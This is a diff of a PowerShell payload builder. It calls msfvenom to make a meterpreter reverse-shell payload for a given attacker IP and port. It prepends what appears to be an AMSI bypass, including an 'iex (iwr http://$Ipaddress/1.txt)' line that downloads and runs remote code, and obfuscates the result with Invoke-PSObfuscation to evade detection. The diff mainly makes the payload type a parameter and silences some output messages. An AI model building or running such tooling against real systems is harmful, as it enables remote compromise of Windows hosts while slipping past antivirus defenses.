@@ -1,15 +1,14 @@
 
 #Parameters
 
-#$Invoke = $args[0];
-$Input_file = $args[0];
+$payload = $args[0];
 $Ipaddress = $args[1];
 $Port = $args[2];
 Write-Host "Processing. ";
 
 #Make meterpreter payload (Change accordingly):
 
-$command = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$Ipaddress LPORT=$Port -f ps1";
+$command = "msfvenom -p $payload LHOST=$Ipaddress LPORT=$Port -f ps1";
 $output = & pwsh -Command $command
 
 # Print the output
@@ -104,7 +103,7 @@ $escapedMake = $Make -replace '_$', '`$'
 $escapedMake | Set-Content -Path $filePath
 
 # Display a confirmation message
-Write-Host "Multi-line code written to '$filePath'."
+#Write-Host "Multi-line code written to '$filePath'."
 
 
 $ams_iBypass = @"
@@ -123,7 +122,7 @@ iex (iwr http://$Ipaddress/1.txt -UseBasicParsing);
 
 $file1 = $ams_iBypass + "`n" + $make3
 
-Write-Output $file1
+#Write-Output $file1
 
 
 
@@ -131,16 +130,16 @@ Write-Output $file1
 $currentDir = $PSScriptRoot
 
 # Specify the filename for the new file
-$fileName = "test.ps1"
+$fileName1 = "test.ps1"
 
 # Combine the current directory and filename to create the file path
-$filePath = Join-Path -Path $currentDir -ChildPath $fileName
+$filePath = Join-Path -Path $currentDir -ChildPath $fileName1
 
 # Write the content to the new file
 $file1 | Set-Content -Path $filePath
 
 # Display a confirmation message
-Write-Host "Multi-line code written to '$filePath'."
+#Write-Host "Multi-line code written to '$filePath'."
 
 
 
@@ -169,4 +168,9 @@ Rev64-Encoder
 
 Write-Host "[+] Loading PSObfuscation and randomizing script.. " -ForegroundColor Blue -NoNewline
 Import-Module $currentDir/Invoke-PSObfuscation.ps1 -Force
+#writes output to 1.txt
 $PSobfuscation = Invoke-PSObfuscation -Path $currentDir/output-file.ps1 -Comments -Variables -OutFile $currentDir/1.txt
+Write-Host "[OK]" -ForegroundColor Green ; Write-Host 
+
+
+Write-Host "`nOutput files: $fileName, 1.txt"
